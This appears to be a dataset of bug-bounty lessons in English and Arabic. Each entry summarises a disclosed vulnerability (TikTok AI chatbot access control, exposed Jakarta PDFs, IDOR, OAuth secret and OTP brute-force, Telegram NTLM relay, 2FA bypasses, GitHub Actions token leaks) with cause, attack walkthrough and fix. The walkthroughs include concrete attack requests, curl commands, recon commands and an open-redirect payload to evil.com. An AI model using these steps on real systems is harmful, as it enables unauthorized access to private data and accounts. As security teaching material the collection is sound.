lesson.fix: Add a global authentication requirement in the Spring Boot configuration (e.g., `spring.security.enabled=true`). Define a security scheme in the OpenAPI spec and enforce it at runtime with Spring Security filters that reject requests lacking a valid token or session cookie. Restrict actuator endpoints to internal IPs or require authentication (`management.endpoints.web.exposure.include=health,info` only). Remove or protect build‑metadata endpoints (`/actuator/info`) and ensure they are not exposed publicly. Finally, verify the OpenAPI document reflects the actual security controls to avoid mismatches.

title: Broken Access Control: Unauthenticated Read/Write Access to Every Conversation in an Tiktok AI…
summary_en: Multiple endpoints in the TikTok AI chatbot failed to enforce authentication, allowing anyone to list recent conversation IDs and read or send messages to any user's chat history without a login.

lesson.cause: The root cause was a complete failure to implement authentication checks on several backend API endpoints. While the application appeared to check for data ownership when a user provided a session cookie (a small file used to remember your login), it completely skipped all security checks if the cookie was missing entirely. This 'fail-open' logic meant that the server assumed any request without a login was safe to process, likely because developers assumed the conversation IDs (unique identification strings) were secret enough to prevent guessing. Additionally, the existence of a global '/conversations' endpoint that listed the 20 most recent chat IDs without any user-specific filtering allowed for easy discovery of other people's private data.
lesson.walkthrough:
RECON
1. Open the chatbot interface and use a proxy tool to capture the HTTP requests (messages sent from your browser to the server).
2. Identify the endpoint used to create a new chat session.
POST /.../agent/coze/conversation/create HTTP/1.1
Why: This request initializes a new chat and generates a unique ID for the conversation (a unique identification string).
3. Identify the endpoint used to send a message to the AI.
POST /.../agent/coze/chat HTTP/1.1
Why: This sends the user's text to the chatbot backend.
4. Identify the endpoint used to retrieve the chat history.
POST /.../agent/coze/conversation/message/list HTTP/1.1
Why: This loads previous messages so the user can see their conversation history.
DISCOVERY
5. Attempt an IDOR (Insecure Direct Object Reference - a bug where you access data by changing an ID) by keeping your login cookie but changing the 'conversation_id' to one you don't own.
{ "conversation_id": "<foreign_id>" }
Why: To see if the server checks if the logged-in user actually owns that specific chat.
6. Observe that the server returns an empty list, which initially suggests that security checks are in place.
EXPLOITATION
7. Perform a 'no-auth' test by removing the Cookie header (the part of the request that proves you are logged in) and resending the history request.
POST /.../agent/coze/conversation/message/list HTTP/1.1 (No Cookie Header)
Why: To check if the server requires a login at all (Authentication: the process of verifying who a user is).
8. Observe that the server returns the full chat history, proving that authentication is not enforced.
9. Search for more sensitive endpoints by guessing variations of the URL, such as changing '/conversation/create' to '/conversations'.
POST /.../agent/coze/conversations HTTP/1.1
Why: Pluralized endpoints often list multiple items; the researcher hoped to find a list of all chats.
10. Observe the response containing a list of the 20 most recent conversation IDs from other users globally.
11. Copy a 'conversation_id' belonging to a different user from that list.
IMPACT
12. Send a message to that foreign ID without being logged in.
POST /.../agent/coze/chat HTTP/1.1 with { "conversation_id": "<stolen_id>", "content": "hi" }
Why: To prove that an attacker can write data (Integrity: the assurance that data is not altered by unauthorized people) to any chat.
13. Request the message history for that same foreign ID.
POST /.../agent/coze/conversation/message/list HTTP/1.1 with { "conversation_id": "<stolen_id>" }
Why: To prove that an attacker can read data (Confidentiality: keeping data secret from unauthorized people) from any chat.
14. Confirm the response contains the injected message and the AI's reply, verifying full unauthorized access.
lesson.example: Imagine a fictional site 'support-bot.target.example' that lets users chat with a help agent. When you chat, your browser sends a request to 'https://support-bot.target.example/api/get_history?chat_id=99'. Normally, your browser also sends a header like 'Authorization: Bearer xyz123' to prove it is you. An attacker notices this and tries to change the ID to 'chat_id=100' while keeping their token, but the server says 'Access Denied'. However, when the attacker uses a tool to send the request 'GET /api/get_history?chat_id=100' with NO Authorization header at all, the server mistakenly thinks it is a public request and returns the full private chat history of user 100. This happens because the code only checks 'Does this token own this ID?' but forgets to check 'Is there even a token present?' before showing the data.
lesson.takeaway: The most important lesson is to always test endpoints by completely removing authentication headers, not just by swapping user accounts. Developers sometimes implement complex logic to check if 'User A' owns 'Object B', but forget to apply a global 'Is the user logged in?' check (Middleware: code that runs before the main logic to verify security). Look for pluralized endpoints (like /users instead of /user) or administrative-sounding paths, as these are often overlooked during security reviews. A common mistake is assuming that 'unguessable' IDs like long strings of random characters are a substitute for real authentication; they are not.
lesson.fix: The developers must implement a mandatory authentication middleware that runs for every request to the '/agent/' and '/conversation/' paths. This middleware should verify that a valid session exists before any other logic is executed; if no session is found, the request must be rejected with a '401 Unauthorized' error. Furthermore, the database query for retrieving messages should always include a filter for the 'user_id' derived from the authenticated session, like 'SELECT * FROM messages WHERE conversation_id = ? AND owner_id = ?'. This ensures that even if a user is logged in, they can only see conversations that belong to their specific account ID. Finally, the global '/conversations' list endpoint should be restricted to administrative users or removed entirely if not needed for the application's functionality.

title: Broken Access Control Leading to Exposure of 7,000+ PII Records on a Jakarta Government Subdomain.
summary_en: A misconfigured subdomain allowed direct download of PDF files containing over 7,000 personal records, exposing sensitive PII without any authentication.

lesson.cause: The server returned a 403 Forbidden for the root path, but static PDF files were served without any access‑control checks. The web server’s configuration treated the PDFs as public resources, bypassing the intended authorization mechanism. No authentication or permission validation was performed before reading the files from disk. This design flaw let anyone request the PDF URLs directly and retrieve the data.
lesson.walkthrough:
RECON
Step 1: Run subdomain enumeration tools to discover hidden hosts.
Command: subfinder -d jakarta.go.id
Why: subfinder sends DNS queries to find subdomains (a subdomain is a part of a larger domain, like "test.example.com").

Step 2: Verify which subdomains respond over HTTP.
Command: httpx -domains discovered.txt
Why: httpx makes HTTP requests (a request is a message sent to a web server) to see if a site is reachable.

Step 3: Identify the target subdomain that returns 403 on the root.
Observation: redacted.jakarta.go.id returns "403 Forbidden" (HTTP status 403 means access is denied).
Why: The server blocks the root path but may not protect other resources.

DISCOVERY
Step 4: Collect all known URLs for the subdomain.
Command: gau redacted.jakarta.go.id
Why: GAU (Get All URLs) queries public sources (search engines, archives) to list every URL the site has ever exposed.

Step 5: Scan the GAU output for PDF files.
Observation: Several entries end with ".pdf" indicating PDF documents.
Why: File extensions tell the browser what type of file to expect; ".pdf" is a Portable Document Format.

Step 6: Open one PDF URL directly in a browser.
Action: Paste the URL into the address bar and press Enter.
Why: The browser sends an HTTP GET request (GET asks the server to return the resource) to fetch the file.

Step 7: Observe that the PDF loads despite the root being blocked.
Result: The PDF is displayed, revealing personal data.
Why: The server did not enforce authentication for that path.

EXPANSION
Step 8: Use a search‑engine dork to find more PDFs on the same host.
Query: site:redacted.jakarta.go.id .pdf
Why: "site:" limits results to the domain, and ".pdf" filters for PDF files.

Step 9: Review the search results; multiple PDF links appear.
Why: Indicates a systematic exposure, not a single mistake.

IMPACT
Step 10: Download a PDF to confirm it contains PII (full names, NIK, birth place, etc.).
Why: Demonstrates the real‑world impact – personal data can be harvested.

Step 11: Document the findings and report them responsibly to the security team.
Why: Responsible disclosure ensures the issue is fixed without further harm.

Step 12: Receive acknowledgment and a certificate of appreciation.
Why: Shows the program’s bug‑bounty process works.
lesson.example:
**Fictional Target:** files.example.com
**Vulnerable Setup:** The web server serves files from "/var/www/files" and has the following Apache config:
```
<Directory "/var/www/files">
    Require all denied
</Directory>

Alias "/public/" "/var/www/files/"
```
The `Require all denied` line blocks the root, but the `Alias` makes every file under "/public/" publicly reachable without authentication.
**Attack Request:**
```
GET /public/records.pdf HTTP/1.1
Host: files.example.com
```
**Why it works:** The `Alias` directive maps the URL path "/public/" directly to the filesystem folder, bypassing the `Require all denied` rule. The server returns the PDF to anyone who knows the URL, exposing any data inside.
lesson.takeaway: When a site returns 403 on the homepage, still probe for static resources like PDFs, images, or documents; they may be unintentionally public. Use tools like GAU, waybackurls, or search‑engine dorks (e.g., `site:target.com filetype:pdf`) to enumerate hidden files. This pattern often appears in misconfigured cloud storage buckets, S3 static sites, or web servers that separate authentication logic from static asset serving. Beginners should avoid assuming a 403 response protects all content – always test individual paths.
lesson.fix: Configure the web server to enforce authentication before serving any file under the protected directory. For Apache, place the `Require all denied` rule inside the same `<Directory>` block that serves the files, or use `<Location>` with proper access controls. Move sensitive PDFs out of the web‑accessible directory or store them behind an application that checks user sessions before delivering the file. Additionally, enable directory‑level access logs to detect unauthorized downloads and regularly scan for publicly exposed files using automated tools.

title: A Simple Question That Led to a Five-Digit Bounty
summary_en: The API returns full customer details for any supplied account_no without verifying the requester’s ownership, resulting in an IDOR information‑disclosure vulnerability.

lesson.cause: The root cause is a missing server‑side authorization check. The backend endpoint /plan_change/Plans/LoginV2Rewamp accepts an "account_no" parameter and returns customer data based solely on that value. No code verifies that the caller owns or is allowed to view the requested account. Because the check is absent, any attacker who can send a request with a different account_no receives that account’s private information. This design flaw turns a legitimate lookup feature into an unrestricted data leak.
lesson.walkthrough:
RECON
Step 1: Identify the target endpoint. The researcher saw a POST request to /plan_change/Plans/LoginV2Rewamp (an HTTP request is a message a client sends to a server). The request body was JSON (JavaScript Object Notation, a text format for data). 
Why: Knowing the URL and method is the first brick in the attack.

Step 2: Observe the request payload. The JSON contained a single parameter "account_no" (a parameter is a named value the server reads). Example payload:
{
 "account_no": "1234567890"
}
Why: The parameter is the knob the attacker can turn.

DISCOVERY
Step 3: Send a valid account_no belonging to the logged‑in user. The server responded with HTTP/1.1 200 OK and a JSON body that included fields like "mobile_num", "email_id", "fullname", and a "token". (HTTP response is the server’s answer; status 200 means success.)
Why: Confirms the endpoint returns personal data.

Step 4: Remove any client‑side checks (the article notes many apps only validate in the browser). The researcher sent the same request without being logged in and still received data.
Why: Shows the server does not enforce authentication.

EXPLOITATION
Step 5: Change the "account_no" value to another known or guessed identifier (e.g., "9876543210").
Payload:
{
 "account_no": "9876543210"
}
Why: Because the server does not verify ownership, it returns the other account’s details.

Step 6: Repeat with many identifiers to enumerate accounts and harvest names, phone numbers, emails, and authentication tokens.
Why: This is the information‑disclosure impact.

IMPACT
Step 7: Collect the disclosed data. The response includes personally identifiable information (PII) and a token that could be reused elsewhere.
Why: Attackers can use PII for phishing, social engineering, or further attacks.
lesson.example:
Assume a fictional service at https://target.example/api/getUser. The server code (pseudo‑code) does:
function getUser(req) {
    var id = req.body.account_no; // reads the supplied parameter
    var user = database.findById(id); // fetches record
    return {status:true, data:user}; // returns everything
}
Because there is no check that req.session.userId == id, any caller can supply any account_no.
Attack request (HTTP POST):
POST https://target.example/api/getUser HTTP/1.1
Content-Type: application/json

{"account_no":"555555"}
The server replies with the full record for account 555555, exposing name, email, phone, etc. The exploit works because the server trusts the supplied identifier without verifying ownership.
lesson.takeaway: When you see an endpoint that returns user data based on an identifier, assume it may lack proper authorization. Look for JSON POST bodies that contain an "id" or "account_no" field and test with values you do not own. Tools like Burp Suite or curl make it easy to replay and modify the payload. Variants of this bug appear in URLs (e.g., /user/123) or in GraphQL queries that accept an ID argument. A common beginner mistake is to assume that a 403 or 401 error means the check is present; many APIs simply return 200 with empty data, which can still be abused if the check is missing.

summary_en: A hardcoded OAuth2 client secret in a public JavaScript bundle allowed an attacker to generate production tokens, brute-force 4-digit OTPs without rate limits, and exfiltrate full KYC data for any merchant.

lesson.cause: The vulnerability was caused by hardcoding production OAuth2 credentials (client_id and client_secret) directly in the frontend JavaScript code, which is accessible to any visitor. This was compounded by a weak 4-digit numeric One-Time Password (OTP) system that lacked rate limiting (a security mechanism that restricts the number of attempts a user can make), allowing an attacker to guess the code within minutes. Finally, the backend trusted the resulting session ID to return sensitive PII (Personally Identifiable Information) without verifying if the requester should have access to that specific record.
lesson.walkthrough:
RECONNAISSANCE
1. The researcher examines the public JavaScript bundle (a large file containing the website's code) at business.example.com.
2. They search for authentication patterns and find hardcoded credentials inside an Axios (a tool used to send data between a browser and a server) configuration.
"auth: { username: 'live_client_id_8f92j3k4', password: 'live_secret_938jf4k2l1' }"
Why: Developers mistakenly included secret keys in the public code. An API key is like a secret password for software to talk to other software.

TOKEN GENERATION
3. The researcher uses the cURL tool (a command-line program for making web requests) to send these credentials to the authentication server.
curl -X GET "https://api.example-gateway.com/oauth/cors/v1/generate?grant_type=client_credentials" -H "Authorization: Basic bGl2ZV9jbGllbnRfaWRfOGY5Mmo...=="
Why: The server validates the leaked keys and returns a Bearer token (a digital key that grants access to specific functions).

OTP TRIGGERING
4. Using the new token, the researcher calls the generate-otp endpoint ( a specific web address for a task) to send an SMS to a target phone number.
curl -X POST "https://business.example.com/api/generate-otp" -d '{"msisdn": "07XXXXXXXX", "token": "Bearer eyJ..."}'
Why: The API trusts the token and sends a real SMS code to the phone number provided in the payload (the data sent in the request).

BRUTE-FORCE ATTACK
5. The researcher attempts to guess the 4-digit code by sending requests to the validate-otp endpoint.
curl -X POST "https://business.example.com/api/validate-otp" -d '{"otp": "0000", "msisdn": "07XXXXXXXX"}'
Why: The server returns an error for wrong guesses but does not block the user from trying again immediately.
6. Because there are only 10,000 possible 4-digit codes (0000-9999), the researcher automates the process to try every combination.
Why: Lack of rate limiting (limiting how fast you can guess) makes it possible to find the correct code in about 33 minutes.

IMPACT
7. When the correct code is guessed, the server returns a sessionId.
{"body": {"sessionId": "b49d70a0-abcd-4596-87a9-8a2f7efc6262"}}
Why: The server believes the user has successfully verified their identity via SMS.
8. The researcher uses this sessionId to request KYC (Know Your Customer) data for the target merchant.
curl -X POST "https://api.example-gateway.com/api/v2/get/applications/msisdn" -d '{"phoneNumber": "07XXXXXXXX", "sessionId": "b49d70a0..."}'
Why: The server returns full PII (names, IDs, addresses) because it incorrectly assumes the possessor of the sessionId is the owner of the data.
lesson.example: Suppose a fictional site target.example has a 'forgot password' feature. A researcher finds a hardcoded 'Firebase API Key' in the site's main.js file. They use this key with a script to connect directly to the site's database. They find an endpoint called /api/verify-code that checks a 3-digit code sent to users' emails. Because the code is only 3 digits (1,000 possibilities) and the server doesn't stop them after 10 wrong guesses, the researcher writes a loop to try every number from 000 to 999. Once they hit the right number, the server gives them a 'reset_token' which they use to change any user's password. This works because the developer put the secret key in the browser and forgot to limit how many times the verification endpoint could be called.
lesson.takeaway: Always inspect client-side JavaScript bundles for sensitive strings like 'key', 'secret', or 'token'. Use automated tools to scan for these patterns during the reconnaissance phase (the initial information gathering). When you find an OTP (One-Time Password) field, always test for rate limiting by sending multiple incorrect guesses rapidly; if the server doesn't block you, it is likely vulnerable to brute-force. A common mistake is assuming that short-lived tokens or 'frontend-only' keys are harmless; in reality, they often provide the initial access needed to exploit deeper backend flaws.

title: Telegram Desktop: From Proxy to RCE in 35 Seconds
summary_en: A malicious proxy can force Telegram Desktop on Windows to automatically perform NTLM authentication, letting an attacker capture NTLM hashes and relay them to internal services for remote code execution with SYSTEM privileges. A separate Qt bug also leaks process memory through authentication responses.

lesson.cause: The root cause is Telegram Desktop’s use of the Qt networking library, which automatically answers NTLM challenges from a proxy using the logged‑in Windows account without prompting the user. This lack of user consent allows a malicious proxy to obtain the victim’s NTLM hash. A second flaw is a Qt bug where authentication responses embed raw process memory, leaking up to 65 KB per request. Both issues stem from insufficient validation and isolation of proxy‑originated data inside the client.
lesson.walkthrough:
RECON
Step 1: The researcher observed that Telegram Desktop supports custom proxy settings. (Why: the app’s proxy feature lets users route traffic through any server.)

Step 2: The researcher set up a malicious proxy server that could issue NTLM challenges. (Why: NTLM is a Windows authentication protocol; a challenge forces the client to prove its identity.)

EXPLOITATION
Step 3: The victim opened Telegram Desktop on Windows and entered the malicious proxy address. (Why: the app connects to the proxy for all network traffic.)

Step 4: The proxy sent an NTLM challenge to the client. (Why: the challenge triggers the client to generate a response using the current Windows credentials.)

Step 5: Qt automatically generated the NTLM response using the logged‑in user’s credentials and sent it back to the proxy. (Why: Qt’s implementation does not ask the user for consent before using Windows credentials.)

Step 6: The proxy captured the NTLM response (NetNTLMv2 hash). (Why: the hash can be used to authenticate elsewhere without knowing the password.)

Step 7: The attacker relayed the captured NTLM hash to an internal certificate service that accepted NTLM authentication. (Why: NTLM relay attacks reuse a captured hash to log into another service.)

Step 8: The certificate service issued a client certificate for the victim’s account. (Why: the certificate proves identity to other Windows services.)

Step 9: Using the certificate, the attacker authenticated to the domain controller and executed commands with SYSTEM privileges. (Why: the domain controller trusts the certificate, granting full control.)

MEMORY_LEAK
Step 10: The proxy triggered another authentication response that unintentionally included raw process memory. (Why: a Qt bug copies memory buffers into the response.)

Step 11: The attacker captured ~65 KB of memory from a single response. (Why: the leaked data can contain usernames, passwords, API keys, etc.)

Step 12: Repeating the request 100 times yielded ~6.5 MB of data in five minutes. (Why: each response leaks additional memory contents.)
lesson.example: **Fictional target:** target.example runs a chat client that uses the same Qt networking library. The client allows users to set a custom proxy. The proxy sends an NTLM challenge. Qt automatically replies with the logged‑in Windows user’s NTLM response. The attacker captures the hash and relays it to an internal SMB server that accepts NTLM, gaining a shell as SYSTEM. **Why it works:** the client does not require user consent before using Windows credentials, and the NTLM hash is reusable for relay attacks. The same memory‑leak bug would expose parts of the client’s memory in each authentication response.
lesson.takeaway: Hunters should test any application that forwards proxy‑originated authentication challenges to see if it automatically uses the current Windows credentials. Look for NTLM or Kerberos challenges in proxy traffic and verify whether the client prompts the user. Tools like Wireshark or mitmproxy can capture these exchanges. Variants include other Windows auth protocols (e.g., Negotiate) and similar auto‑auth behavior in libraries like libcurl. A common mistake is assuming that because a proxy is user‑configured, the client will not expose credentials; always verify the authentication flow.
lesson.fix: Telegram should modify the Qt integration to require explicit user consent before responding to NTLM challenges from a proxy, or simply disable NTLM for in‑app proxies. The fix can be implemented by checking a flag before calling the Windows SSPI API and prompting the user if the proxy requests authentication. Additionally, the memory‑leak bug must be patched by ensuring that authentication response buffers are zero‑cleared and do not include unrelated memory regions before being sent. Telegram 6.9.2 implements these changes: NTLM is disabled for proxies configured inside the app, and the response‑building code was hardened to prevent accidental memory exposure.

title: $1600 Bounty on a Main Domain
summary_en: Four bugs on a VDP main domain: an open redirect via CRLF injection, a 2FA bypass that accepts email OTPs for phone verification, sensitive account data leaked in the login response before 2FA completes, and a session fixation flaw letting a captured _sc_session cookie skip 2FA on other accounts — $1600 total.
summary_ar: باحث في برنامج VDP خاص اكتشف 4 ثغرات في الدومين الرئيسي: Open Redirect عبر CRLF injection، وثغرة بتسمح باستخدام كود تأكيد الإيميل للتحقق من رقم الهاتف (2FA bypass)، وتسريب بيانات الحساب في الـ login response قبل إتمام الـ 2FA، وSession Fixation بتمكّن من إعادة استخدام كوكي _sc_session لتجاوز الـ 2FA على حسابات تانية — بمجموع جوائز $1600.

lesson.cause_ar: الـ root cause الأساسي إن التطبيق بيفصلش بين قنوات التحقق: نفس الـ API (verify_two_factor_auth) بيستقبل كود الـ OTP سواء جاي من الإيميل أو من الهاتف من غير ما يربط الكود بالقناة اللي اتبعت عليها، فكود الإيميل بيشتغل لتأكيد رقم الهاتف. كمان كوكي _sc_session اللي بتتضبط بعد إتمام الـ 2FA مش مربوطة بالحساب نفسه، فأي حد معاه الكوكي يقدر يستخدمها على حساب تاني من غير 2FA. وفي تسجيل الدخول، الـ response بيرجع بيانات حساسة كاملة (اسم، username، secret token، PIN، عنوان) قبل ما الـ 2FA يخلص أصلاً. والـ redirectTo بيتحقق منه بشكل ناقص سمح بـ CRLF injection عبر /%0d/.
lesson.walkthrough_ar: الباحث debu8er كان بيشتغل على برنامج VDP خاص بيهدف إنه يـ triage 20 bug، واتعلم من فيديوهات zseano على يوتيوب. بعد ما اتعملت له دعوة خاصة لبرنامج scope بتاعه wildcard (_.redacted.com)، قرر يركّز على الدومين الرئيسي بس من غير subdomain discovery، وفضل يختبر function ورا function لـ 3 أسابيع من غير أي نتيجة. أول حاجة لفتت نظره إن بعد الـ logout المستخدم بيتحوّل لـ /login?redirectTo=/account، فلما جرّب يغيّر القيمة لـ https://evil.com و //evil.com ما اشتغلش، لكن لما جرّب /%0d/evil.com اتعمل redirect لـ evil.com — بس اتشال كـ duplicate لأن حد تاني بلغها قبله بيوم. بعدها لاحظ إن التطبيق بيستخدم نفس الـ API للتحقق من كود الإيميل وكود الهاتف: POST /api/v1/users/two_factor_auth?email=... للتحقق بالإيميل و POST /api/v1/users/two_factor_auth?phone=... للهاتف، والتحقق النهائي بيحصل عبر POST /api/v1/users/verify_two_factor_auth بجسم JSON زي {"otp_attempt":"116293"}. فافترض إنه يقدر يبدأ phone verification وبعدين يرسل كود الإيميل الجديد مكان كود الهاتف — وطلعت الفرضية صح، فاتقبل النظام كود الإيميل لتأكيد رقم الهاتف، واتصنّفت Medium (6.1) بـ $300. وفي subdomain تابع للدومين الرئيسي (few.redacted.com)، لاحظ إن الـ login response قبل ما يدخل كود الـ 2FA بيرجع بيانات الحساب كاملة: الاسم، اللقب، username، secret token، رقم الهاتف، PIN، والعنوان — من غير ما يكمّل الـ 2FA، واتصنّفت Medium (4.4) بـ $300. آخر حاجة كانت Session Fixation: بعد إتمام الـ 2FA بيتبعت كوكي _sc_session، واكتشف إن الكوكي دي بتتشاف على حسابات تانية، فسجّل الدخول بحساب A وكمّل الـ 2FA والتقط الكوكي، وبعدين استخدمها على حساب B من غير 2FA — اتشالت duplicate على الويب، لكن لما دوّر في تطبيق Android لقى نفس الثغرة في API تاني، واتصنّفت High (7.7) بـ $1000.
lesson.takeaway_ar: أي flow فيه 2FA يستاهل تختبره من زاوية "هل الكود مربوط بالقناة اللي اتبعت عليها؟" — جرّب تبدأ تحقق بالإيميل وبعدين تقدم كود من قناة تانية، ولاحظ لو الـ verify endpoint واحد لكل القنوات. كمان أي كوكي بتتضبط بعد خطوة حساسة (زي الـ 2FA) لازم تتأكد إنها مربوطة بالحساب: اعمل account A و account B واعبر الكوكي بينهم. ولاحظ دايماً الـ response بتاع الـ login قبل إتمام الـ 2FA — لو فيه بيانات حساسة بتتسرب، دي ثغرة مستقلة. ولو لقيت duplicate على الويب، دوّر على نفس الـ endpoint في تطبيقات الموبايل أو APIs تانية — غالباً نفس الـ bug بيتكرر في مكان تاني.
lesson.fix_ar: الحل الصح إن كود الـ OTP يتبقى مربوط بالقناة اللي اتبعت عليها (email أو phone) وبالجلسة اللي بدأت الطلب، والـ verify endpoint لازم يتحقق إن الكود اتبعت للقناة المطلوبة فعلاً مش أي كود صالح. وكوكي _sc_session لازم تكون مربوطة بالحساب والجلسة، وتتبطل (invalidate) لو اتعاد استخدامها أو اتحاول على حساب تاني. والـ login response لازم يرجّع البيانات الحساسة بس بعد إتمام كل خطوات المصادقة، ومتنساش إن الـ redirectTo لازم يتحقق منه بـ allowlist للدومينات الداخلية مع رفض أي CRLF أو protocol-relative URLs زي //evil.com.

title: ArtiPACKED: Hacking Giants Through a Race Condition in GitHub Actions Artifacts
program: GitHub, Google (Firebase), Microsoft, AWS, Red Hat, Canonical (Ubuntu Adsys), OWASP
summary_en: Unit 42's ArtiPACKED research abused a race condition in GitHub Actions workflow artifacts to leak GitHub and cloud tokens from public repos of Red Hat, Google, AWS, Microsoft, Canonical and OWASP, enabling repo compromise and potential cloud access.
summary_ar: بحث ArtiPACKED من Unit 42 استغل Race Condition في GitHub Actions workflow artifacts لتسريب توكنات GitHub وسحابة من ريبوهات عامة لـ Red Hat وGoogle وAWS وMicrosoft وCanonical وOWASP، ما كان ممكن يسمح باختراق الريبوهات والوصول للبيئات السحابية.

lesson.cause_ar: الـ root cause إن فرق التطوير بتعامل مع workflow artifacts على GitHub Actions كأنها مخرجات build عادية ومؤقتة من غير أي credential hygiene، بينما هي في الحقيقة بتتسرب منها توكنات — سواء توكنات خدمات سحابية تبع طرف تالت أو GitHub tokens — وأي حد عنده read access على الريبو يقدر يستهلكها. الافتراض الغلط إن الـ artifacts مش حساسة ومش متاحة لغير المطوّرين، لكن في الريبوهات العامة أي حد في العالم يقدر يفتحها. ووجود Race Condition في طريقة تعامل GitHub Actions مع الـ artifacts خلّى نافذة الاستغلال أوسع، وده بيتماشى مع OWASP CICD-SEC-06 (Insufficient Credential Hygiene) اللي المقال بيستشهد بيه كأحد أهم مخاطر الـ CI/CD.
lesson.walkthrough_ar: الباحث Yaron Avital كان متابع حدسه إن في feature مهملة اسمها workflow artifacts على GitHub — المنصة اللي بتستضيف أغلب المشاريع مفتوحة المصدر — وقرر يفحصها. بدأ يستكشف الـ artifacts اللي بتتولّد من workflows الـ CI/CD في ريبوهات عامة لشركات كبيرة، وكان مقتنع إنه هيّلاقي sensitive data أو credentials. النتيجة كانت أكبر من اللي كان متخيله: لقى إن الـ artifacts بتسرّب توكنات، سواء توكنات خدمات سحابية تبع طرف تالت أو GitHub tokens، وكلها متاحة لأي حد عنده read access على الريبو. أكثر تسريب شائع كان GitHub tokens، وده بيخوّل المهاجم يتصرف باسم الريبو اللي شغّل الـ workflow نفسه. من هنا يقدر يدفع malicious code يتدفق للإنتاج عبر الـ CI/CD pipeline، أو يقرا secrets مخزنة في الريبو والـ organization. البحث كشف مشاريع مفتوحة المصدر معروفة جدًا مملوكة لـ Red Hat وGoogle (Firebase) وAWS وMicrosoft وCanonical (Ubuntu Adsys) وOWASP. كل الحالات اتبلّغت للمسؤولين عن المشاريع، وكل الفرق تعاونت بسرعة عشان يخففوا الأثر. التقنية الأساسية اللي اتعملت عليها التسمية ArtiPACKED هي Race Condition في طريقة تعامل GitHub Actions مع الـ artifacts، وده اللي وسّع تأثير التسريب من مجرد توكنات لاختراق محتمل للبيئات السحابية.
lesson.takeaway_ar: أي وقت تشتغل على هدف فيه CI/CD على GitHub، نزّل workflow artifacts من الـ runs وافحصها بـ grep على أنماط التوكنات المعروفة (ghp_, AKIA, AIza وغيرها). دور على الـ workflows اللي بتستخدم secrets وبعدين بتعمل upload-artifact، وافحص مدة الاحتفاظ بالـ artifacts وإعدادات الوصول ليها. النمط ده بيتكرر في أي نظام بيخزّن مخرجات build وبيستهلكها بعدين عمليات بصلاحيات أعلى — والـ race condition في التعامل مع الملفات المؤقتة دي علامة إن في حاجة ممكن تستغلها. كمان ركّز على الريبوهات العامة لأن الـ read access فيها متاح لأي حد، فالتسريب بيبقى متاح للجميع مش بس للموظفين.
lesson.fix_ar: الحل الصح مش بس إنهم مسحوا الـ artifacts — لازم من الأساس ممنوع تخزين أي secret جوه artifact؛ استخدم secret manager أو OIDC tokens قصيرة العمر بدل التوكنات طويلة العمر في الـ workflows. فعّل retention قصير للـ artifacts وقيّد الوصول ليها، وضيف فحص تلقائي للـ secrets على أي ملف بيتعمل له upload-artifact قبل ما يخرج من الـ pipeline. وده بالظبط اللي بيقوله OWASP CICD-SEC-06 عن credential hygiene: افصل صلاحيات الـ build عن صلاحيات الإنتاج، وخلّي أي توكن يشتغل بأقل privilege ممكن.
